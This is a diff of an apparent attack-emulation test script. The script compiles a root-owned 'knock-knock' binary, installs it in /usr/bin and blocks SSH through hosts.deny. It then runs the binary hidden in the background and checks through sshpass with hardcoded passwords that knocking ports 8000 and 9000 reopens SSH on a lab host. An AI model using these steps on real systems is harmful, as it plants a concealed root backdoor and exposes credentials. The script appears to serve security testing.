@@ -1,19 +1,30 @@
-;
+Elevation Required;
 #pre
+cp /etc/hosts.allow /tmp/hosts.allow
 gcc /home/ubuntu/attack/knock-knock.c -o /tmp/knock-knock
-sudo chown root:root /tmp/knock-knock
-sudo chmod 700 /tmp/knock-knock
-sudo mv /tmp/knock-knock /usr/bin/
-echo "sshd: ALL" | sudo tee -a /etc/hosts.deny
+chown root:root /tmp/knock-knock
+chmod 700 /tmp/knock-knock
+mv /tmp/knock-knock /usr/bin/
+echo "sshd: ALL" | tee -a /etc/hosts.deny
 #command
-sudo /usr/bin/knock-knock
-#check检查这里有待商榷
-before=$(ssh ubuntu@localhost -p 22)
-ssh ubuntu@localhost -p 8000
-ssh ubuntu@localhost -p 9000
-after=$(ssh ubuntu@localhost -p 22)
+nohup /usr/bin/knock-knock >/dev/null 2>&1 &
+#check
+echo "尝试用ssh默认端口连接靶机："
+before_search_string="Connection reset by peer"
+after_search_string="ubuntu"
+before_connect=$(sshpass -p "010404grz" ssh -o StrictHostKeyChecking=no ubuntu@10.10.21.106 'sshpass -p "010404" ssh -o StrictHostKeyChecking=no ubuntu@10.10.21.203 "whoami"' 2>&1)
+echo $before_connect
+if [[ $before_connect == *"$before_search_string"* ]]; then :; else echo "No such file or directory"; fi
+echo "knock靶机8000端口："
+sshpass -p "010404grz" ssh -o StrictHostKeyChecking=no ubuntu@10.10.21.106 'ssh ubuntu@10.10.21.203 -p 8000' 2>&1
+echo "knock靶机9000端口："
+sshpass -p "010404grz" ssh -o StrictHostKeyChecking=no ubuntu@10.10.21.106 'ssh ubuntu@10.10.21.203 -p 9000' 2>&1
+echo "再次尝试用ssh默认端口连接靶机并执行whoami命令："
+after_connect=$(sshpass -p "010404grz" ssh -o StrictHostKeyChecking=no ubuntu@10.10.21.106 'sshpass -p "010404" ssh -o StrictHostKeyChecking=no ubuntu@10.10.21.203 "whoami"')
+echo $after_connect
+if [[ $after_connect == *"$after_search_string"* ]]; then :; else echo "No such file or directory"; fi
 #cleanup
+mv /tmp/hosts.allow /etc/hosts.allow
 sudo sed -i '/sshd: ALL/d' /etc/hosts.deny
 sudo killall knock-knock
 sudo rm /usr/bin/knock-knock
-
